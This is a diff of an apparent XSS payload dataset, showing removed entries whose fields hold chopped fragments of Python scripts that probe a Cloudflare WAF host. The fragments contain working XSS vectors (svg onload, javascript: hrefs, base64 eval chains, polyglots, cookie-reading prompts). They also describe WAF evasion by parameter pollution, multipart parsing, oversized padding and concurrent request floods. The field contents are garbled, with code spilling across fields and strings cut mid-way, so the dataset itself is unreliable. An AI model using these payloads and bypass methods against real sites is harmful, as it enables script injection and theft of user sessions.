@@ -1,22 +1,8 @@
 {
   "category": "xss",
   "subcategory": "svg_based",
-  "count": 175,
+  "count": 144,
   "payloads": [
-    {
-      "id": "xss-0002",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "bypass\"].append((name, payload, context[:200]))\n                print(f\"  {name:55s} HTTP {status}  *** FULL BYPASS ***\")\n                print(f\"    -> {context[:150]}\")\n                return True, context\n            elif has_dangerous:\n                results[\"partial\"].append((name, payload, context[:200]))\n                print(f\"  {name:55s} HTTP {status}  ** PARTIAL **\")\n                print(f\"    -> {context[:150]}\")\n                return True, context\n            elif context and len(context) > 3:\n                results[\"interesting\"].append((name, payload, context[:200]))\n                print(f\"  {name:55s} HTTP {status}  (reflected)\")\n                return True, context\n            else:\n                print(f\"  {name:55s} HTTP {status}\")\n                return False, \"\"\n        else:\n            print(f\"  {name:55s} BLOCK\")\n            return False, \"\"\n    except Exception as e:\n        print(f\"  {name:55s} ERROR: {e}\")\n        return False, \"\"\n\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 70)\nprint(\"6A: Boundary Mapping — What gets through the WAF?\")\nprint(\"=\" * 70 + \"\n\")\n\n# Test individual building blocks to see what's allowed\nbuilding_blocks = {\n    # Tags without events\n    \"bare-svg\": \"<svg>",
-      "description": "bare-img\": \"<img>\",\n    \"bare-div\": \"<div>\",\n    \"bare-input\": \"<input>\",\n    \"bare-a\": \"<a>\",\n    \"bare-iframe\": \"<iframe>\",\n    \"bare-script-open\": \"<script>\",\n    \"bare-style\": \"<style>\",\n    \"bare-object\": \"<object>\",\n    \"bare-embed\": \"<embed>\",\n    \"bare-form\": \"<form>\",\n    \"bare-button\": \"<button>\",\n    \"bare-select\": \"<select>\",\n    \"bare-textarea\": \"<textarea>\",\n    \"bare-details\": \"<details>\",\n    \"bare-video\": \"<video>\",\n    \"bare-audio\": \"<audio>\",\n    \"bare-math\": \"<math>\",\n\n    # Tags with benign attributes\n    \"svg-with-id\": '<svg id=x>',\n    \"img-with-src\": '<img src=x>',\n    \"div-with-class\": '<div class=x>',\n    \"input-with-value\": '<input value=x>',\n    \"a-with-href\": '<a href=#>',\n    \"input-autofocus\": '<input autofocus>',\n    \"input-tabindex\": '<input tabindex=1>',\n    \"details-open\": '<details open>',\n\n    # Event attribute names alone (no = or value)\n    \"svg-onload-bare\": '<svg onload>',\n    \"img-onerror-bare\": '<img onerror>',\n    \"div-onclick-bare\": '<div onclick>',\n\n    # Event with benign value\n    \"div-onclick-empty\": '<div onclick=\"\">',\n    \"div-onclick-void\": '<div onclick=\"void(0)\">',\n    \"div-onclick-return\": '<div onclick=\"return false\">',\n    \"div-onclick-null\": '<div onclick=\"null\">',\n\n    # Just the word alert\n    \"just-alert\": \"alert(1)\",\n    \"just-confirm\": \"confirm(1)\",\n    \"just-prompt\": \"prompt(1)\",\n\n    # JS without tags\n    \"js-standalone\": \"javascript:alert(1)\",\n    \"js-code\": \"eval('alert(1)",
-      "technique": "direct_injection",
-      "source_file": "waf_round6.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
     {
       "id": "xss-0003",
       "category": "xss",
@@ -130,34 +116,6 @@
       "blocked": true
     },
     {
-      "id": "xss-0019",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "bypass\"].append((name, str(params or data)[:100],\n                                          input_area[:200] + \" | \" + div_content[:100]))\n                tag = \" *** XSS ***\"\n            elif input_area and ('value=\"\"' in input_area and '\" ' in input_area):\n                tag = \" [BREAKOUT]\"\n            elif div_content and len(div_content) > 5:\n                results[\"interesting\"].append((name, \"\", div_content[:100]))\n                tag = \" (reflected)\"\n\n            print(f\"  {name:55s} HTTP {status}{tag}\")\n            if tag and (\"XSS\" in tag or \"BREAKOUT\" in tag):\n                print(f\"    -> {input_area[:150]}\")\n        else:\n            print(f\"  {name:55s} BLOCK\")\n    except Exception as e:\n        print(f\"  {name:55s} ERROR: {e}\")\n\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 70)\nprint(\"10A: Attribute Breakout + No-Event XSS Vectors\")\nprint(\"=\" * 70 + \"\n\")\n\n# Break out of value, inject elements that execute JS without on*=\nno_event = {\n    # Inject <a href=javascript:> (no event handler needed, click-to-trigger)\n    \"break-a-href-js\": {\"attributeHtml\": '\"><a href=\"javascript:alert(1)\">click</a><input x=\"'},\n    \"break-a-href-entity\": {\"attributeHtml\": '\"><a href=\"&#106;avascript:alert(1)\">click</a><input x=\"'},\n    \"break-a-href-tab\": {\"attributeHtml\": '\"><a href=\"java\tscript:alert(1)\">click</a><input x=\"'},\n\n    # Inject <form action=javascript:> with submit button\n    \"break-form-action\": {\"attributeHtml\": '\"><form action=\"javascript:alert(1)\"><button>click</button></form><input x=\"'},\n    # Inject button with formaction\n    \"break-formaction\": {\"attributeHtml\": '\"><button formaction=\"javascript:alert(1)\">click</button><input x=\"'},\n\n    # Inject <iframe srcdoc>\n    \"break-iframe-srcdoc\": {\"attributeHtml\": '\"><iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe><input x=\"'},\n\n    # Inject <object data>\n    \"break-object-data\": {\"attributeHtml\": '\"><object data=\"javascript:alert(1)\"></object><input x=\"'},\n\n    # Inject <embed>\n    \"break-embed-src\": {\"attributeHtml\": '\"><embed src=\"javascript:alert(1)\"><input x=\"'},\n\n    # Inject <meta refresh>\n    \"break-meta-refresh\": {\"attributeHtml\": '\"><meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\"><input x=\"'},\n\n    # Inject <math> with href\n    \"break-math-href\": {\"attributeHtml\": '\"><math href=\"javascript:alert(1)\">click</math><input x=\"'},\n    \"break-math-xlink\": {\"attributeHtml\": '\"><math xlink:href=\"javascript:alert(1)\">click</math><input x=\"'},\n\n    # Inject <svg><a href>\n    \"break-svg-a-href\": {\"attributeHtml\": '\"><svg><a href=\"javascript:alert(1)\"><text>click</text></a></svg><input x=\"'},\n\n    # Inject <base> to hijack other links\n    \"break-base-js\": {\"attributeHtml\": '\"><base href=\"javascript://\"><input x=\"'},\n}\n\nfor name, params in no_event.items():\n    test(name, params)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 70)\nprint(\"10B: Minimal Tag Injection After Breakout\")\nprint(\"=\" * 70 + \"\n\")\n\n# What tags can we inject after \"> ?\ntag_inject = {\n    # Single tags\n    \"break-gt-a\": {\"attributeHtml\": '\"><a>'},\n    \"break-gt-b\": {\"attributeHtml\": '\"><b>'},\n    \"break-gt-i\": {\"attributeHtml\": '\"><i>'},\n    \"break-gt-p\": {\"attributeHtml\": '\"><p>'},\n    \"break-gt-br\": {\"attributeHtml\": '\"><br>'},\n    \"break-gt-hr\": {\"attributeHtml\": '\"><hr>'},\n    \"break-gt-div\": {\"attributeHtml\": '\"><div>'},\n    \"break-gt-span\": {\"attributeHtml\": '\"><span>'},\n    \"break-gt-math\": {\"attributeHtml\": '\"><math>'},\n    \"break-gt-table\": {\"attributeHtml\": '\"><table>'},\n    \"break-gt-form\": {\"attributeHtml\": '\"><form>'},\n    \"break-gt-button\": {\"attributeHtml\": '\"><button>'},\n    \"break-gt-textarea\": {\"attributeHtml\": '\"><textarea>'},\n    \"break-gt-select\": {\"attributeHtml\": '\"><select>'},\n    \"break-gt-details\": {\"attributeHtml\": '\"><details>'},\n    \"break-gt-summary\": {\"attributeHtml\": '\"><summary>'},\n    \"break-gt-marquee\": {\"attributeHtml\": '\"><marquee>'},\n    \"break-gt-style\": {\"attributeHtml\": '\"><style>'},\n    \"break-gt-link\": {\"attributeHtml\": '\"><link>'},\n    \"break-gt-script\": {\"attributeHtml\": '\"><script>'},\n    \"break-gt-svg\": {\"attributeHtml\": '\"><svg>'},\n    \"break-gt-img\": {\"attributeHtml\": '\"><img>'},\n    \"break-gt-input\": {\"attributeHtml\": '\"><input>'},\n    \"break-gt-iframe\": {\"attributeHtml\": '\"><iframe>'},\n    \"break-gt-object\": {\"attributeHtml\": '\"><object>'},\n    \"break-gt-embed\": {\"attributeHtml\": '\"><embed>'},\n    \"break-gt-video\": {\"attributeHtml\": '\"><video>'},\n    \"break-gt-audio\": {\"attributeHtml\": '\"><audio>'},\n    \"break-gt-source\": {\"attributeHtml\": '\"><source>'},\n    \"break-gt-meta\": {\"attributeHtml\": '\"><meta>'},\n    \"break-gt-base\": {\"attributeHtml\": '\"><base>'},\n    \"break-gt-title\": {\"attributeHtml\": '\"><title>'},\n    \"break-gt-noscript\": {\"attributeHtml\": '\"><noscript>'},\n    \"break-gt-template\": {\"attributeHtml\": '\"><template>'},\n}\n\nfor name, params in tag_inject.items():\n    test(name, params)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 70)\nprint(\"10C: Tags with Safe Attributes After Breakout\")\nprint(\"=\" * 70 + \"\n\")\n\n# For tags that pass, try adding attributes (building toward XSS)\nsafe_attrs = {\n    # <a> with href (if <a> passes)\n    \"break-a-href-hash\": {\"attributeHtml\": '\"><a href=#>link'},\n    \"break-a-href-http\": {\"attributeHtml\": '\"><a href=http://x>link'},\n    \"break-a-href-mailto\": {\"attributeHtml\": '\"><a href=mailto:x>link'},\n    \"break-a-href-tel\": {\"attributeHtml\": '\"><a href=tel:x>link'},\n    \"break-a-href-data\": {\"attributeHtml\": '\"><a href=data:,>link'},\n    \"break-a-href-blob\": {\"attributeHtml\": '\"><a href=blob:x>link'},\n\n    # <form> with action\n    \"break-form-action-http\": {\"attributeHtml\": '\"><form action=http://x>'},\n    \"break-form-action-data\": {\"attributeHtml\": '\"><form action=data:,>'},\n\n    # <button> with formaction\n    \"break-button-fa-hash\": {\"attributeHtml\": '\"><button formaction=#>click'},\n    \"break-button-fa-http\": {\"attributeHtml\": '\"><button formaction=http://x>click'},\n\n    # <math> with attributes\n    \"break-math-id\": {\"attributeHtml\": '\"><math id=x>test'},\n    \"break-math-class\": {\"attributeHtml\": '\"><math class=x>test'},\n    \"break-math-tabindex\": {\"attributeHtml\": '\"><math tabindex=1>test'},\n    \"break-math-href\": {\"attributeHtml\": '\"><math href=#>test'},\n    \"break-math-xlink-href\": {\"attributeHtml\": '\"><math xlink:href=#>test'},\n    \"break-math-defurl\": {\"attributeHtml\": '\"><math definitionURL=#>test'},\n\n    # <input> with type\n    \"break-input-image\": {\"attributeHtml\": '\"><input type=image src=x'},\n    \"break-input-hidden\": {\"attributeHtml\": '\"><input type=hidden value=x'},\n\n    # <link> with rel and href\n    \"break-link-stylesheet\": {\"attributeHtml\": '\"><link rel=stylesheet href=//x'},\n    \"break-link-prefetch\": {\"attributeHtml\": '\"><link rel=prefetch href=//x'},\n\n    # <style> with content\n    \"break-style-body\": {\"attributeHtml\": '\"><style>body{background:red}</style'},\n    \"break-style-import\": {\"attributeHtml\": '\"><style>@import url(//x)</style'},\n}\n\nfor name, params in safe_attrs.items():\n    test(name, params)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 70)\nprint(\"10D: Multipart POST (different WAF parsing)\")\nprint(\"=\" * 70 + \"\n\")\n\nimport io\n\n# Multipart form data — WAF might parse the boundary differently\nboundary = \"----WebKitFormBoundaryXYZ\"\n\npayloads_mp = {\n    \"mp-onfocus\": '\" autofocus onfocus=alert(1) x=\"",
-      "description": "mp-math-click\": '\"><math onclick=alert(1)>test',\n    \"mp-svg-onload\": '\"><svg onload=alert(1)>',\n    \"mp-img-onerror\": '\"><img src=x onerror=alert(1)>',\n    \"mp-script\": '\"><script>alert(1)</script>',\n}\n\nfor name, payload in payloads_mp.items():\n    body = (\n        f\"--{boundary}\\r\\n\"\n        f'Content-Disposition: form-data; name=\"attributeHtml\"\\r\\n'\n        f\"\\r\\n\"\n        f\"{payload}\\r\\n\"\n        f\"--{boundary}--\\r\\n",
-      "technique": "direct_injection",
-      "source_file": "waf_round10.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0023",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "ale'+'rt']({g}['doc'+'ument']['dom'+'ain']);//\")\n    PS_GLOBAL.append(f\"';{g}[/*foo*/'alert'/*bar*/]({g}[/*foo*/'document'/*bar*/]['domain']);//\")\n    PS_GLOBAL.append(f\"';{g}['\\\\x61\\\\x6c\\\\x65\\\\x72\\\\x74']({g}['\\\\x64\\\\x6f\\\\x63\\\\x75\\\\x6d\\\\x65\\\\x6e\\\\x74']['\\\\x64\\\\x6f\\\\x6d\\\\x61\\\\x69\\\\x6e']);//\")\n    PS_GLOBAL.append(f\"';{g}['\\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074']({g}['\\\\u0064\\\\u006f\\\\u0063\\\\u0075\\\\u006d\\\\u0065\\\\u006e\\\\u0074']['\\\\u0064\\\\u006f\\\\u006d\\\\u0061\\\\u0069\\\\u006e']);//\")\n\nfor p in PS_GLOBAL:\n    test(p)\nprint(f\"  PS globals done: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\n# D. PortSwigger Polyglots\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- D: PortSwigger Polyglots ---\")\n\nPS_POLYGLOTS = [\n    \"\"\"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>\"\"",
-      "description": "\"\"javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\\\" onmouseover=/*&lt;svg/*/onload=alert()//>\"\"\",\n    \"\"\"javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>\"\"\",\n]\n\nfor p in PS_POLYGLOTS:\n    test(p)\nprint(f\"  PS polyglots done: {total} total",
-      "technique": "polyglot",
-      "source_file": "waf_round72_oss2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
       "id": "xss-0025",
       "category": "xss",
       "subcategory": "svg_based",
@@ -177,20 +135,6 @@
       "subcategory": "svg_based",
       "payload": "on')\n        if idx > 0:\n            variants.add(payload[:idx] + 'oNLy=1 ' + payload[idx:])\n    \n    # Add ignored attribute (gprime31 bypass)\n    if '<img' in payload.lower() or '<svg' in payload.lower():\n        variants.add(payload.replace('src=x",
       "description": "ignored=() src=x', 1))\n    \n    # Add fake attribute before real event (s0md3v bypass)\n    if 'onload=' in payload.lower():\n        variants.add(payload.replace('onload=', 'onx=() onload=",
-      "technique": "direct_injection",
-      "source_file": "waf_round72_oss2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0033",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "//1152848220/')>\",\n    # location trick\n    \"<svg/onload=location/**/='javascript:alert(1)'>\",\n    # find() trick\n    \"%27%09);%0d%0a%09%09[1].find(alert)//\",\n    # document.write base64\n    \"document.write(atob('PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='))\",\n    # Autofocus mixed case\n    '\"Onx=() AutOfOcUs OnfOCuS=prompt(document.cookie)>',\n    # Long padding entity\n    '\"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;',\n]\n\nfor p in LATEST_2025:\n    test(p)\nprint(f\"  Latest 2025 done: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\n# H. Exotic tag + event combos from PortSwigger\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- H: Exotic Tag+Event Combos ---\")\n\nEXOTIC_TAGS = [\n    'xss",
-      "description": "custom-tag', 'a', 'abbr', 'address', 'animate', 'animatetransform',\n    'audio', 'b', 'bdi', 'bdo', 'blockquote', 'br', 'button', 'canvas',\n    'caption', 'cite', 'code', 'col', 'colgroup', 'data', 'datalist', 'dd',\n    'del', 'details', 'dfn', 'dialog', 'div', 'dl', 'dt', 'em', 'embed',\n    'fieldset', 'figcaption', 'figure', 'footer', 'form', 'h1', 'h2', 'h3',\n    'header', 'hr', 'i', 'iframe', 'img', 'input', 'ins', 'kbd', 'label',\n    'legend', 'li', 'link', 'main', 'map', 'mark', 'marquee', 'menu',\n    'meter', 'nav', 'object', 'ol', 'optgroup', 'option', 'output', 'p',\n    'picture', 'pre', 'progress', 'q', 'ruby', 's', 'samp', 'section',\n    'select', 'slot', 'small', 'source', 'span', 'strong', 'sub', 'summary',\n    'sup', 'svg', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot',\n    'th', 'thead', 'time', 'tr', 'track', 'u', 'ul', 'var', 'video', 'wbr',\n]\n\nEXOTIC_EVENTS = [\n    'onanimationend', 'onanimationstart', 'onbeforeinput', 'onbeforematch',\n    'onbeforetoggle', 'onblur', 'oncontentvisibilityautostatechange',\n    'onfocus', 'onfocusin', 'onload', 'onerror', 'onmouseover',\n    'onpointerenter', 'onscrollend', 'onscrollsnapchange', 'ontoggle',\n    'ontransitionend', 'ontransitionstart', 'onwheel',\n]\n\n# Test subset — 50 tags × 4 events = 200\nfor tag in EXOTIC_TAGS[:50]:\n    for ev in ['onfocus', 'onmouseover', 'onpointerenter', 'onbeforeinput",
       "technique": "direct_injection",
       "source_file": "waf_round72_oss2.py",
       "tested_against": [
@@ -305,20 +249,6 @@
       "description": "hpp-3param\": \"?globalHtml=%3Csvg&globalHtml=%20onload%3D&globalHtml=alert(1)%3E\",\n    \"hpp-first-safe\": \"?globalHtml=safe&globalHtml=%3Csvg/onload%3Dalert(1)%3E\",\n    \"hpp-last-safe\": \"?globalHtml=%3Csvg/onload%3Dalert(1)%3E&globalHtml=safe\",\n    # Mix globalHtml and attributeHtml\n    \"hpp-mixed\": \"?globalHtml=%3Csvg&attributeHtml=%22%20onload%3Dalert(1)%20x%3D%22\",\n    # Semicolon separator (some servers treat ; as &)\n    \"hpp-semi\": \"?globalHtml=%3Csvg;globalHtml=onload%3Dalert(1)%3E\",\n    # Array notation\n    \"hpp-array\": \"?globalHtml[]=%3Csvg/onload%3Dalert(1)%3E\",\n    \"hpp-array0\": \"?globalHtml[0]=%3Csvg/onload%3Dalert(1)%3E\",\n}\n\nfor name, qs in hpp.items():\n    raw_request(name,\n        b\"GET \" + qs.encode() + b\" HTTP/1.1\\r\\n\"\n        b\"Host: waf.cumulusfire.net\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n",
       "technique": "encoding",
       "source_file": "waf_round22_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0051",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "\n\" + \"=\" * 75)\nprint(\"25F: Race Condition — Rapid Sequential Requests\")\nprint(\"=\" * 75 + \"\n\")\n\n# Some WAFs have rate-based bypasses where rapid requests\n# cause the WAF to skip inspection on some.\nimport concurrent.futures\nimport threading\n\nsafe_payload = {\"globalHtml\": \"safe_content\"}\nxss_payload = {\"globalHtml\": \"<svg/onload=alert(1)>\"}\nrace_found = False\n\ndef send_xss():\n    global race_found\n    try:\n        r = requests.get(BASE, params=xss_payload, verify=False, timeout=5)\n        if r.status_code not in (403, 406, 503):\n            if 'onload=' in r.text.lower():\n                race_found = True\n                print(f\"  *** RACE BYPASS: HTTP {r.status_code} ***\")\n                return True\n    except:\n        pass\n    return False\n\ndef send_safe():\n    try:\n        requests.get(BASE, params=safe_payload, verify=False, timeout=5)\n    except:\n        pass\n\n# Send 20 safe + 5 XSS simultaneously\nprint(\"  Sending 25 concurrent requests (20 safe + 5 XSS)...\")\nwith concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:\n    futures = []\n    for _ in range(20):\n        futures.append(executor.submit(send_safe))\n    for _ in range(5):\n        futures.append(executor.submit(send_xss))\n    concurrent.futures.wait(futures)\n\nif not race_found:\n    print(\"  No race condition bypass found.\")\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"25G: Large Payload — Exceed WAF Inspection Buffer\")\nprint(\"=\" * 75 + \"\n\")\n\n# Some WAFs only inspect the first N bytes. Put XSS after a large padding.\nfor size in [4000, 8000, 16000, 32000, 64000, 128000]:\n    padding = \"A\" * size\n    payload = f'{padding}<svg/onload=alert(1)>'\n    try:\n        r = requests.get(BASE, params={\"globalHtml\": payload},\n                        verify=False, timeout=15)\n        blocked = r.status_code in (403, 406, 503)\n        if not blocked and 'onload=' in r.text.lower():\n            print(f\"  SIZE {size:>6d}: HTTP {r.status_code} *** BYPASS ***\")\n            found.append((f\"size-{size}",
-      "description": "\"))\n        elif not blocked:\n            print(f\"  SIZE {size:>6d}: HTTP {r.status_code} (no reflection)",
-      "technique": "direct_injection",
-      "source_file": "waf_round25_final.py",
       "tested_against": [
         "cloudflare_waf"
       ],
@@ -466,20 +396,6 @@
       "blocked": true
     },
     {
-      "id": "xss-0119",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "\n--- C: Remaining globalHtml Base64 Combos ---\")\nHTML_B64 = [\n    # Nested eval chain\n    '<script>eval(eval(atob(\"YXRvYihcIllXeGxjblFvTVNrPVwiKQ==\")))</script>',\n    # Base64 of entire page\n    f'<iframe src=\"data:text/html;base64,{base64.b64encode(b\"<body onload=alert(1)>\").decode()}\">',\n    f'<iframe src=\"data:text/html;base64,{base64.b64encode(b\"<svg onload=alert(1)>\").decode()}\">',\n    f'<iframe src=\"data:text/html;base64,{base64.b64encode(b\"<img src=x onerror=alert(1)>\").decode()}\">',\n    f'<object data=\"data:text/html;base64,{base64.b64encode(b\"<script>alert(1)</script>\").decode()}\">',\n    f'<embed src=\"data:text/html;base64,{base64.b64encode(b\"<script>alert(1)</script>\").decode()}\">',\n    # Script src base64\n    f'<script src=\"data:text/javascript;base64,{base64.b64encode(b\"alert(1)\").decode()}\"></script>',\n    f'<script src=\"data:application/javascript;base64,{base64.b64encode(b\"alert(1)\").decode()}\"></script>',\n    # SVG with base64 encoded JS\n    f'<svg><script href=\"data:text/javascript;base64,{base64.b64encode(b\"alert(1)\").decode()}\"></script></svg>',\n    # Import map + base64\n    f'<script type=module>import(\"data:text/javascript;base64,{base64.b64encode(b\"alert(1)\").decode()}\")</script>',\n    # Worker with base64\n    f'<script>new Worker(\"data:text/javascript;base64,{base64.b64encode(b\"postMessage(1)\").decode()}\")</script>',\n    # SharedWorker\n    f'<script>new SharedWorker(\"data:text/javascript;base64,{base64.b64encode(b\"alert(1)\").decode()}\")</script>',\n    # ServiceWorker\n    f'<script>navigator.serviceWorker.register(\"data:text/javascript;base64,{base64.b64encode(b\"alert(1)\").decode()}\")</script>',\n]\n\nfor p in HTML_B64:\n    get(p)\n    post(p)\nprint(f\"  Remaining globalHtml done: {total} total\")\n\n# D: Cross-WAF + base64 with stealth headers\nprint(\"\n--- D: Stealth + Cross-WAF + Base64 ---\")\nSTEALTH_UA = [\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-      "description": "Googlebot/2.1 (+http://www.google.com/bot.html)\",\n    \"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)\",\n    \"curl/8.0\", \"python-requests/2.31.0\", \"wget/1.21\",\n]\n\nB64_XSS = [\n    '<svg/onload=eval(atob(\"YWxlcnQoMSk=",
-      "technique": "direct_injection",
-      "source_file": "waf_round80_last.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
       "id": "xss-0120",
       "category": "xss",
       "subcategory": "svg_based",
@@ -501,20 +417,6 @@
       "description": "svg-fo-benign\": '<svg><foreignObject><b>bold</b></foreignObject></svg>',\n    # Math wrapping SVG foreignObject\n    \"math-svg-fo\": '<math><annotation-xml encoding=\"image/svg+xml\"><svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg></annotation-xml></math>',\n    # Self-close + foreignObject\n    \"sc-fo\": {\"attributeHtml\": '\"/><foreignObject><img src=x onerror=alert(1)>'},\n    \"sc-fo-benign\": {\"attributeHtml\": '\"/><foreignObject><b>bold</b>'},\n    # MathML mfenced as container\n    \"mfenced-fo\": '<math><mfenced><foreignObject><b>bold</b></foreignObject></mfenced></math>',\n}\n\nfor name, payload in foreign.items():\n    if isinstance(payload, dict):\n        t(name, payload)\n    else:\n        t(name, {\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"24E: Template Tag Injection (Shadow DOM)",
       "technique": "direct_injection",
       "source_file": "waf_round24_mathml.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0162",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "REFLECTED\" if reflected else \"PASSED\")\n        \n        print(f\"[{result}] {label[:60]:<60} | Status: {status}\")\n        \n        if not blocked and reflected:\n            print(f\"  ⚠️  POTENTIAL XSS: {payload[:100]}\")\n            return True\n        \n        return False\n    \n    except Exception as e:\n        print(f\"[ERROR] {label[:60]:<60} | {str(e)[:30]}\")\n        return False\n\nprint(\"=\"*80)\nprint(\"IMAGE-BASED XSS TESTING\")\nprint(\"=\"*80)\n\nfound = []\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n### 1. SVG-Based XSS ###\n\")\n\nsvg_payloads = [\n    # Basic SVG with script\n    '<svg><script>alert(1)</script></svg>',\n    \n    # SVG with onload\n    '<svg onload=\"alert(1)\"></svg>",
-      "description": "<svg onload=alert(1)></svg>',\n    '<svg/onload=alert(1)>',\n    \n    # SVG with namespace\n    '<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"></svg>',\n    \n    # SVG with animate\n    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',\n    '<svg><set onbegin=alert(1) attributeName=x to=0>',\n    \n    # SVG with foreignObject\n    '<svg><foreignObject><body onload=alert(1)></foreignObject></svg>',\n    '<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>',\n    \n    # SVG with use + xlink\n    '<svg><use xlink:href=\"data:image/svg+xml,<svg id=x onload=alert(1)></svg>#x\"></svg>',\n    \n    # SVG with image tag\n    '<svg><image xlink:href=\"javascript:alert(1)\"></svg>',\n    '<svg><image href=\"javascript:alert(1)\"></svg>',\n    \n    # Minimal SVG\n    '<svg onload=alert(1)>',\n    '<svg/onload=alert`1`>',\n    \n    # SVG with encoded payload\n    '<svg><script>&#97;&#108;&#101;&#114;&#116;(1)</script></svg>',\n    '<svg><script>\\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074(1)</script></svg>',\n]\n\nfor payload in svg_payloads:\n    if test_payload(payload, label=f\"SVG: {payload[:50]}",
-      "technique": "encoding",
-      "source_file": "waf_image_xss.py",
       "tested_against": [
         "cloudflare_waf"
       ],
@@ -599,20 +501,6 @@
       "description": "test<svg onload=alert(1)>.svg',\n    '\"><img src=x onerror=alert(1)>.jpg',\n]\n\nfor payload in filename_payloads:\n    # Simulate file upload with XSS in filename\n    boundary = \"----WebKitFormBoundary\"\n    body = (\n        f\"------WebKitFormBoundary\\r\\n\"\n        f'Content-Disposition: form-data; name=\"file\"; filename=\"{payload}\"\\r\\n'\n        f\"Content-Type: image/svg+xml\\r\\n\\r\\n\"\n        f\"<svg></svg>\\r\\n\"\n        f\"------WebKitFormBoundary--\\r\\n",
       "technique": "direct_injection",
       "source_file": "waf_image_xss.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0169",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "\n\" + \"=\" * 70)\nprint(\"11A: Self-Close Breakout Deep Exploration\")\nprint(\"=\" * 70 + \"\n\")\n\n# \"/><math x=\" works as self-close. What if we DON'T create a new tag\n# but instead modify the existing <input> element's behavior?\nselfclose = {\n    # Inject multiple attributes on the existing input tag\n    # The input becomes: <input type=\"text\" value=\"\" autofocus id=x name=y ...>\n    \"sc-autofocus-id\": {\"attributeHtml\": '\" autofocus id=xss_test name=q x=\"'},\n    # type=image makes input render an image — src error might trigger\n    \"sc-type-image-src\": {\"attributeHtml\": '\" type=image src=x x=\"'},\n    # type=image + alt (renders broken image with alt text)\n    \"sc-type-image-alt\": {\"attributeHtml\": '\" type=image src=x alt=XSS x=\"'},\n    # Add form + formaction to existing input\n    \"sc-formaction\": {\"attributeHtml\": '\" formaction=javascript:alert(1) x=\"'},\n    \"sc-formaction-http\": {\"attributeHtml\": '\" formaction=http://x x=\"'},\n    \"sc-formaction-data\": {\"attributeHtml\": '\" formaction=data:text/html,test x=\"'},\n    # pattern attribute (for form validation, not XSS but interesting)\n    \"sc-pattern\": {\"attributeHtml\": '\" pattern=.* x=\"'},\n    # list attribute (connects to datalist)\n    \"sc-list\": {\"attributeHtml\": '\" list=x x=\"'},\n    # dir=auto (potential for RTL override attack)\n    \"sc-dir-auto\": {\"attributeHtml\": '\" dir=auto x=\"'},\n    # draggable\n    \"sc-draggable\": {\"attributeHtml\": '\" draggable=true x=\"'},\n    # contenteditable on input\n    \"sc-contenteditable\": {\"attributeHtml\": '\" contenteditable=true x=\"'},\n    # spellcheck\n    \"sc-spellcheck\": {\"attributeHtml\": '\" spellcheck=true x=\"'},\n}\n\nfor name, params in selfclose.items():\n    test(name, params, show=True)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 70)\nprint(\"11B: POST Body with Large Padding\")\nprint(\"=\" * 70 + 